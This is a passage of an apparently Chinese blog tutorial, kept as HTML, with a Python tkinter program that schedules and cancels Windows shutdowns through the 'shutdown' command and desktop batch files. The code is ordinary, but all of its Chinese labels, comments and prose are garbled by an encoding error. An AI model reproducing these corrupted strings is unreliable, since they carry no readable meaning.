<li>ç‚¹å‡» <strong>â€œå¥½â€</strong> ä¿å­˜è®¾ç½®ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-5">pythonä»£ç å®ç°ï¼š</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a063f0e643534b19b6c1cfa0df2c50ac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUGllcm9QQw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444027&amp;x-signature=13a3Vx2v36p1BnKSU9v7Yq4g3c8%3D" alt="image.png" loading="lazy"/>
ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ Python tkinter å®ç°å‰ä¸‰ç§å®šæ—¶å…³æœºæ–¹æ³•çš„å®Œæ•´ç¨‹åºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> tkinter <span class="hljs-keyword">as</span> tk
<span class="hljs-keyword">from</span> tkinter <span class="hljs-keyword">import</span> ttk, messagebox
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> subprocess
<span class="hljs-keyword">import</span> threading
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime, timedelta

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ShutdownTimerApp</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, root</span>):
        self.root = root
        self.root.title(<span class="hljs-string">"å®šæ—¶å…³æœºå·¥å…· v1.0"</span>)
        self.root.geometry(<span class="hljs-string">"600x500"</span>)
        
        <span class="hljs-comment"># è®¾ç½®æ ·å¼</span>
        self.setup_styles()
        
        <span class="hljs-comment"># åˆ›å»ºä¸»ç•Œé¢</span>
        self.create_widgets()
        
        <span class="hljs-comment"># å­˜å‚¨å®šæ—¶ä»»åŠ¡çº¿ç¨‹</span>
        self.shutdown_thread = <span class="hljs-literal">None</span>
        self.is_scheduled = <span class="hljs-literal">False</span>
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_styles</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è®¾ç½®ç•Œé¢æ ·å¼"""</span>
        style = ttk.Style()
        style.configure(<span class="hljs-string">'Title.TLabel'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">16</span>, <span class="hljs-string">'bold'</span>))
        style.configure(<span class="hljs-string">'Method.TLabelframe.Label'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">11</span>, <span class="hljs-string">'bold'</span>))
        style.configure(<span class="hljs-string">'Large.TButton'</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_widgets</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºç•Œé¢ç»„ä»¶"""</span>
        <span class="hljs-comment"># æ ‡é¢˜</span>
        title_label = ttk.Label(self.root, text=<span class="hljs-string">"å®šæ—¶å…³æœºå·¥å…·"</span>, style=<span class="hljs-string">'Title.TLabel'</span>)
        title_label.pack(pady=<span class="hljs-number">20</span>)
        
        <span class="hljs-comment"># åˆ›å»ºç¬”è®°æœ¬æ§ä»¶ï¼ˆé€‰é¡¹å¡ï¼‰</span>
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=<span class="hljs-string">'both'</span>, expand=<span class="hljs-literal">True</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ–¹æ³•ä¸€ï¼šä½¿ç”¨å‘½ä»¤</span>
        self.create_method1_tab()
        
        <span class="hljs-comment"># æ–¹æ³•äºŒï¼šå¿«æ·æ–¹å¼</span>
        self.create_method2_tab()
        
        <span class="hljs-comment"># æ–¹æ³•ä¸‰ï¼šä»»åŠ¡è®¡åˆ’ï¼ˆç®€åŒ–ç‰ˆï¼‰</span>
        self.create_method3_tab()
        
        <span class="hljs-comment"># çŠ¶æ€æ </span>
        self.create_status_bar()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method1_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•ä¸€é€‰é¡¹å¡ï¼šä½¿ç”¨å‘½ä»¤"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•ä¸€ï¼šå‘½ä»¤è¡Œè®¾ç½®"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"é€šè¿‡Windows shutdownå‘½ä»¤è®¾ç½®å®šæ—¶å…³æœº\næ”¯æŒè®¾ç½®ä»»æ„ç§’æ•°åå…³æœº"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´è®¾ç½®åŒºåŸŸ</span>
        time_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"è®¾ç½®å…³æœºæ—¶é—´"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        time_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># é¢„è®¾æ—¶é—´æŒ‰é’®</span>
        preset_frame = ttk.Frame(time_frame)
        preset_frame.pack(pady=<span class="hljs-number">10</span>)
        
        preset_times = [
            (<span class="hljs-string">"30åˆ†é’Ÿå"</span>, <span class="hljs-number">1800</span>),
            (<span class="hljs-string">"1å°æ—¶å"</span>, <span class="hljs-number">3600</span>),
            (<span class="hljs-string">"2å°æ—¶å"</span>, <span class="hljs-number">7200</span>),
            (<span class="hljs-string">"3å°æ—¶å"</span>, <span class="hljs-number">10800</span>),
            (<span class="hljs-string">"5åˆ†é’Ÿå"</span>, <span class="hljs-number">300</span>)
        ]
        
        <span class="hljs-keyword">for</span> text, seconds <span class="hljs-keyword">in</span> preset_times:
            btn = ttk.Button(preset_frame, text=text, 
                           command=<span class="hljs-keyword">lambda</span> s=seconds: self.set_custom_time(s))
            btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># è‡ªå®šä¹‰æ—¶é—´è¾“å…¥</span>
        custom_frame = ttk.Frame(time_frame)
        custom_frame.pack(pady=<span class="hljs-number">10</span>)
        
        ttk.Label(custom_frame, text=<span class="hljs-string">"è‡ªå®šä¹‰æ—¶é—´ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.hour_var = tk.StringVar(value=<span class="hljs-string">"0"</span>)
        hour_spin = ttk.Spinbox(custom_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">5</span>, 
                               textvariable=self.hour_var)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(custom_frame, text=<span class="hljs-string">"å°æ—¶"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.minute_var = tk.StringVar(value=<span class="hljs-string">"30"</span>)
        minute_spin = ttk.Spinbox(custom_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">5</span>,
                                 textvariable=self.minute_var)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(custom_frame, text=<span class="hljs-string">"åˆ†é’Ÿ"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        <span class="hljs-comment"># å‘½ä»¤é¢„è§ˆåŒºåŸŸ</span>
        preview_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å‘½ä»¤é¢„è§ˆ"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        preview_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        self.command_var = tk.StringVar()
        command_label = ttk.Label(preview_frame, textvariable=self.command_var, 
                                 font=(<span class="hljs-string">'Consolas'</span>, <span class="hljs-number">10</span>))
        command_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        self.set_btn1 = ttk.Button(button_frame, text=<span class="hljs-string">"è®¾ç½®å®šæ—¶å…³æœº"</span>, 
                                  command=self.set_shutdown_cmd, style=<span class="hljs-string">'Large.TButton'</span>)
        self.set_btn1.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        self.cancel_btn1 = ttk.Button(button_frame, text=<span class="hljs-string">"å–æ¶ˆå®šæ—¶å…³æœº"</span>, 
                                     command=self.cancel_shutdown_cmd, style=<span class="hljs-string">'Large.TButton'</span>)
        self.cancel_btn1.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ›´æ–°å‘½ä»¤é¢„è§ˆ</span>
        self.update_command_preview()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method2_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•äºŒé€‰é¡¹å¡ï¼šå¿«æ·æ–¹å¼"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•äºŒï¼šåˆ›å»ºå¿«æ·æ–¹å¼"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"ä¸ºå¸¸ç”¨å…³æœºæ—¶é—´åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼\nåŒå‡»å³å¯å¯åŠ¨å®šæ—¶å…³æœº"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼è®¾ç½®</span>
        shortcut_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼è®¾ç½®"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        shortcut_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼åç§°</span>
        name_frame = ttk.Frame(shortcut_frame)
        name_frame.pack(pady=<span class="hljs-number">10</span>, anchor=<span class="hljs-string">'w'</span>, padx=<span class="hljs-number">20</span>)
        
        ttk.Label(name_frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼åç§°ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        self.shortcut_name = tk.StringVar(value=<span class="hljs-string">"å®šæ—¶å…³æœº"</span>)
        name_entry = ttk.Entry(name_frame, textvariable=self.shortcut_name, width=<span class="hljs-number">30</span>)
        name_entry.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># å…³æœºæ—¶é—´è®¾ç½®</span>
        time_frame = ttk.Frame(shortcut_frame)
        time_frame.pack(pady=<span class="hljs-number">10</span>, anchor=<span class="hljs-string">'w'</span>, padx=<span class="hljs-number">20</span>)
        
        ttk.Label(time_frame, text=<span class="hljs-string">"å…³æœºæ—¶é—´ï¼š"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.shortcut_hours = tk.StringVar(value=<span class="hljs-string">"1"</span>)
        hour_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">3</span>,
                               textvariable=self.shortcut_hours)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">"å°æ—¶"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.shortcut_minutes = tk.StringVar(value=<span class="hljs-string">"0"</span>)
        minute_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">3</span>,
                                 textvariable=self.shortcut_minutes)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">"åˆ†é’Ÿ"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        <span class="hljs-comment"># å¿«æ·æ–¹å¼å†…å®¹é¢„è§ˆ</span>
        preview_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å¿«æ·æ–¹å¼å†…å®¹"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        preview_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        self.shortcut_content = tk.Text(preview_frame, height=<span class="hljs-number">4</span>, font=(<span class="hljs-string">'Consolas'</span>, <span class="hljs-number">9</span>))
        self.shortcut_content.pack(pady=<span class="hljs-number">10</span>, padx=<span class="hljs-number">10</span>, fill=<span class="hljs-string">'x'</span>)
        self.shortcut_content.insert(<span class="hljs-string">'1.0'</span>, <span class="hljs-string">"shutdown -s -t 3600"</span>)
        self.shortcut_content.config(state=<span class="hljs-string">'disabled'</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        create_btn = ttk.Button(button_frame, text=<span class="hljs-string">"åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼"</span>, 
                               command=self.create_shortcut, style=<span class="hljs-string">'Large.TButton'</span>)
        create_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        test_btn = ttk.Button(button_frame, text=<span class="hljs-string">"æµ‹è¯•æ­¤æ—¶é—´è®¾ç½®"</span>, 
                             command=self.test_shortcut_time, style=<span class="hljs-string">'Large.TButton'</span>)
        test_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># ç»‘å®šå˜é‡å˜åŒ–äº‹ä»¶</span>
        self.shortcut_hours.trace(<span class="hljs-string">'w'</span>, self.update_shortcut_preview)
        self.shortcut_minutes.trace(<span class="hljs-string">'w'</span>, self.update_shortcut_preview)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_method3_tab</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ–¹æ³•ä¸‰é€‰é¡¹å¡ï¼šä»»åŠ¡è®¡åˆ’ï¼ˆç®€åŒ–ç‰ˆï¼‰"""</span>
        frame = ttk.Frame(self.notebook)
        self.notebook.add(frame, text=<span class="hljs-string">"æ–¹æ³•ä¸‰ï¼šå®šæ—¶ä»»åŠ¡"</span>)
        
        <span class="hljs-comment"># è¯´æ˜æ ‡ç­¾</span>
        desc = <span class="hljs-string">"è®¾ç½®æ¯å¤©å›ºå®šæ—¶é—´è‡ªåŠ¨å…³æœº\né€‚åˆè§„å¾‹æ€§å®šæ—¶å…³æœºéœ€æ±‚"</span>
        desc_label = ttk.Label(frame, text=desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>))
        desc_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´è®¾ç½®</span>
        schedule_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"å®šæ—¶è®¾ç½®"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        schedule_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æ—¶é—´é€‰æ‹©</span>
        time_frame = ttk.Frame(schedule_frame)
        time_frame.pack(pady=<span class="hljs-number">15</span>, anchor=<span class="hljs-string">'center'</span>)
        
        ttk.Label(time_frame, text=<span class="hljs-string">"æ¯å¤©å…³æœºæ—¶é—´ï¼š"</span>, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">10</span>)).pack(side=<span class="hljs-string">'left'</span>)
        
        self.schedule_hour = tk.StringVar(value=<span class="hljs-string">"22"</span>)
        hour_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">23</span>, width=<span class="hljs-number">3</span>,
                               textvariable=self.schedule_hour)
        hour_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        ttk.Label(time_frame, text=<span class="hljs-string">":"</span>).pack(side=<span class="hljs-string">'left'</span>)
        
        self.schedule_minute = tk.StringVar(value=<span class="hljs-string">"00"</span>)
        minute_spin = ttk.Spinbox(time_frame, from_=<span class="hljs-number">0</span>, to=<span class="hljs-number">59</span>, width=<span class="hljs-number">3</span>,
                                 textvariable=self.schedule_minute)
        minute_spin.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># ä»»åŠ¡çŠ¶æ€æ˜¾ç¤º</span>
        self.task_status_var = tk.StringVar(value=<span class="hljs-string">"å½“å‰æ— å®šæ—¶ä»»åŠ¡"</span>)
        status_label = ttk.Label(schedule_frame, textvariable=self.task_status_var,
                                font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        status_label.pack(pady=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># è®¡ç®—ä¸‹æ¬¡å…³æœºæ—¶é—´</span>
        self.next_time_var = tk.StringVar()
        next_time_label = ttk.Label(schedule_frame, textvariable=self.next_time_var,
                                   font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        next_time_label.pack(pady=<span class="hljs-number">5</span>)
        
        <span class="hljs-comment"># æ¨¡æ‹Ÿä»»åŠ¡åŒºåŸŸ</span>
        sim_frame = ttk.LabelFrame(frame, text=<span class="hljs-string">"æ¨¡æ‹Ÿä»»åŠ¡ç®¡ç†"</span>, style=<span class="hljs-string">'Method.TLabelframe'</span>)
        sim_frame.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">20</span>, pady=<span class="hljs-number">10</span>)
        
        sim_desc = <span class="hljs-string">"""æ³¨æ„ï¼šè¿™æ˜¯ç®€åŒ–ç‰ˆæ¨¡æ‹Ÿå®šæ—¶ä»»åŠ¡ã€‚
çœŸå®çš„Windowsä»»åŠ¡è®¡åˆ’éœ€è¦ç®¡ç†å‘˜æƒé™å’Œå¤æ‚é…ç½®ã€‚
æœ¬ç¨‹åºä½¿ç”¨Pythonçº¿ç¨‹æ¨¡æ‹Ÿå®šæ—¶åŠŸèƒ½ã€‚"""</span>
        sim_label = ttk.Label(sim_frame, text=sim_desc, font=(<span class="hljs-string">'å¾®è½¯é›…é»‘'</span>, <span class="hljs-number">9</span>))
        sim_label.pack(pady=<span class="hljs-number">10</span>, padx=<span class="hljs-number">10</span>)
        
        <span class="hljs-comment"># æŒ‰é’®åŒºåŸŸ</span>
        button_frame = ttk.Frame(frame)
        button_frame.pack(pady=<span class="hljs-number">20</span>)
        
        self.schedule_btn = ttk.Button(button_frame, text=<span class="hljs-string">"å¯åŠ¨å®šæ—¶ä»»åŠ¡"</span>, 
                                      command=self.toggle_schedule, style=<span class="hljs-string">'Large.TButton'</span>)
        self.schedule_btn.pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
        ttk.Button(button_frame, text=<span class="hljs-string">"ç«‹å³æµ‹è¯•å…³æœº"</span>, 
                  command=self.test_schedule_shutdown, style=<span class="hljs-string">'Large.TButton'</span>).pack(side=<span class="hljs-string">'left'</span>, padx=<span class="hljs-number">10</span>)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_status_bar</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºçŠ¶æ€æ """</span>
        status_frame = ttk.Frame(self.root)
        status_frame.pack(fill=<span class="hljs-string">'x'</span>, side=<span class="hljs-string">'bottom'</span>, pady=<span class="hljs-number">5</span>)
        
        self.status_var = tk.StringVar(value=<span class="hljs-string">"å°±ç»ª"</span>)
        status_label = ttk.Label(status_frame, textvariable=self.status_var, 
                                relief=<span class="hljs-string">'sunken'</span>, anchor=<span class="hljs-string">'w'</span>)
        status_label.pack(fill=<span class="hljs-string">'x'</span>, padx=<span class="hljs-number">10</span>, pady=<span class="hljs-number">2</span>)
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_custom_time</span>(<span class="hljs-params">self, seconds</span>):
        <span class="hljs-string">"""è®¾ç½®è‡ªå®šä¹‰æ—¶é—´åˆ°è¾“å…¥æ¡†"""</span>
        hours = seconds // <span class="hljs-number">3600</span>
        minutes = (seconds % <span class="hljs-number">3600</span>) // <span class="hljs-number">60</span>
        
        self.hour_var.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">str</span>(hours))
        self.minute_var.<span class="hljs-built_in">set</span>(<span class="hljs-built_in">str</span>(minutes))
        self.update_command_preview()
        
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_command_preview</span>(<span class="hljs-params">self, *args</span>):
        <span class="hljs-string">"""æ›´æ–°å‘½ä»¤é¢„è§ˆ"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.hour_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.minute_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &gt; <span class="hljs-number">0</span>:
                self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>)
            <span class="hljs-keyword">else</span>:
                self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
        <span class="hljs-keyword">except</span> ValueError:
            self.command_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆæ•°å­—"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_shortcut_preview</span>(<span class="hljs-params">self, *args</span>):
        <span class="hljs-string">"""æ›´æ–°å¿«æ·æ–¹å¼å†…å®¹é¢„è§ˆ"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &gt; <span class="hljs-number">0</span>:
                content = <span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>
                self.shortcut_content.config(state=<span class="hljs-string">'normal'</span>)
                self.shortcut_content.delete(<span class="hljs-string">'1.0'</span>, <span class="hljs-string">'end'</span>)
                self.shortcut_content.insert(<span class="hljs-string">'1.0'</span>, content)
                self.shortcut_content.config(state=<span class="hljs-string">'disabled'</span>)
        <span class="hljs-keyword">except</span> ValueError:
            <span class="hljs-keyword">pass</span>
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">set_shutdown_cmd</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""æ‰§è¡Œæ–¹æ³•ä¸€ï¼šè®¾ç½®å…³æœºå‘½ä»¤"""</span>
        <span class="hljs-keyword">try</span>:
            hours = <span class="hljs-built_in">int</span>(self.hour_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.minute_var.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            <span class="hljs-comment"># æ‰§è¡Œå…³æœºå‘½ä»¤</span>
            subprocess.run(<span class="hljs-string">f"shutdown -s -t <span class="hljs-subst">{seconds}</span>"</span>, shell=<span class="hljs-literal">True</span>)
            
            <span class="hljs-comment"># è®¡ç®—å…³æœºæ—¶é—´</span>
            shutdown_time = datetime.now() + timedelta(seconds=seconds)
            
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, 
                <span class="hljs-string">f"å®šæ—¶å…³æœºå·²è®¾ç½®ï¼\n"</span>
                <span class="hljs-string">f"ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­\n"</span>
                <span class="hljs-string">f"é¢„è®¡å…³æœºæ—¶é—´ï¼š<span class="hljs-subst">{shutdown_time.strftime(<span class="hljs-string">'%Y-%m-%d %H:%M:%S'</span>)}</span>\n\n"</span>
                <span class="hljs-string">f"å¦‚éœ€å–æ¶ˆï¼Œè¯·ä½¿ç”¨å–æ¶ˆæŒ‰é’®æˆ–è¿è¡Œå‘½ä»¤ï¼šshutdown -a"</span>)
            
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">f"å·²è®¾ç½® <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³æœº"</span>)
            
        <span class="hljs-keyword">except</span> ValueError:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">"è¯·è¾“å…¥æœ‰æ•ˆçš„æ•°å­—"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"è®¾ç½®å¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">cancel_shutdown_cmd</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""å–æ¶ˆå®šæ—¶å…³æœº"""</span>
        <span class="hljs-keyword">try</span>:
            subprocess.run(<span class="hljs-string">"shutdown -a"</span>, shell=<span class="hljs-literal">True</span>)
            messagebox.showinfo(<span class="hljs-string">"æˆåŠŸ"</span>, <span class="hljs-string">"å®šæ—¶å…³æœºå·²å–æ¶ˆ"</span>)
            self.status_var.<span class="hljs-built_in">set</span>(<span class="hljs-string">"å®šæ—¶å…³æœºå·²å–æ¶ˆ"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            messagebox.showerror(<span class="hljs-string">"é”™è¯¯"</span>, <span class="hljs-string">f"å–æ¶ˆå¤±è´¥ï¼š<span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)
            
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_shortcut</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""åˆ›å»ºæ¡Œé¢å¿«æ·æ–¹å¼"""</span>
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># è·å–æ¡Œé¢è·¯å¾„</span>
            desktop_path = os.path.join(os.path.expanduser(<span class="hljs-string">'~'</span>), <span class="hljs-string">'Desktop'</span>)
            
            <span class="hljs-comment"># è®¡ç®—ç§’æ•°</span>
            hours = <span class="hljs-built_in">int</span>(self.shortcut_hours.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            minutes = <span class="hljs-built_in">int</span>(self.shortcut_minutes.get() <span class="hljs-keyword">or</span> <span class="hljs-number">0</span>)
            seconds = hours * <span class="hljs-number">3600</span> + minutes * <span class="hljs-number">60</span>
            
            <span class="hljs-keyword">if</span> seconds &lt;= <span class="hljs-number">0</span>:
                messagebox.showwarning(<span class="hljs-string">"è­¦å‘Š"</span>, <span class="hljs-string">"è¯·è®¾ç½®æœ‰æ•ˆçš„å…³æœºæ—¶é—´"</span>)
                <span class="hljs-keyword">return</span>
                
            <span class="hljs-comment"># åˆ›å»ºæ‰¹å¤„ç†æ–‡ä»¶</span>
            bat_content = <span class="hljs-string">f"""@echo off
echo æ­£åœ¨è®¾ç½®å®šæ—¶å…³æœº...
echo ç³»ç»Ÿå°†åœ¨ <span class="hljs-subst">{hours}</span>å°æ—¶<span class="hljs-subst">{minutes}</span>åˆ†é’Ÿåå…³é—­
shutdown -s -t <span class="hljs-subst">{seconds}</span>
pause
"""</span>
            
            <span class="hljs-comment"># åˆ›å»ºå¿«æ·æ–¹å¼å†…å®¹ï¼ˆVBSè„šæœ¬ï¼‰</span>
            shortcut_name = self.shortcut_name.get() <span class="hljs-keyword">or</span> <span class="hljs-string">"å®šæ—¶å…³æœº"</span>
            bat_filename = <span class="hljs-string">f"<span class="hljs-subst">{shortcut_name}</span>.bat"</span>
            bat_path = os.path.join(desktop_path, bat_filename)
            
